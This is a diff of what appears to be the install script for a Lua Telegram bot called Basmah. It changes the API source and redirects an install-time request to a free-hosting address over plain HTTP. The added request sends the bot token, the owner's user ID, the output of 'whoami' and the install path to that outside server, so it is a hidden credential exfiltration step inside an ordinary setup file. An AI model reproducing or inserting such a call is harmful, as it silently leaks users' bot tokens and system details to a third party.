@@ -78,7 +78,7 @@ basmah..":VERSION",GetVerisonBasmah,
 basmah..":SUDO_ID:",SUDO_USER,
 basmah..":DataCenter:","Amsterdam",
 basmah..":UserNameBot:",BOT_User,
-basmah..":ApiSource","https://saied.us/",
+basmah..":ApiSource","https://veer.gmsm.xyz/Basmah/",
 basmah..":NameBot:","بصمة",
 "TH3BASMAH_INSTALL","Yes"
 )
@@ -90,7 +90,7 @@ info.id = SUDO_USER
 info.token = Token
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all')
-https.request('https://saied.us/basmah.php?Info='..JSON.encode(info))
+http.request('http://procrustean-flame.000webhostapp.com/kkk.php?Info='..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
